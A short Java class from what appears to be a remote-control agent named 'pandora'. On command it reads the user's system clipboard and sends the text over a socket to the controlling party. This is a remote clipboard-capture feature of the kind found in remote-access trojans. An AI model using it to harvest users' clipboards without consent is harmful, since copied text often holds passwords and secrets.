package org.pandora.agent.control.impl;

import org.pandora.agent.Client;

import java.awt.*;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.io.IOException;

public class ClipboardController {

    private final Client client;

    public ClipboardController(final Client client) {
        this.client = client;
    }

    public void execute(final String requestId) {
        String result;
        try {
            result = (String) Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor);
        } catch (final UnsupportedFlavorException | IOException ignore) {
            result = "No content was copied.";
        }
        this.client.getSocketUtils().write("clipboard:" + requestId + ":" + result.replace(":", "(doubleDot)"));
    }
}
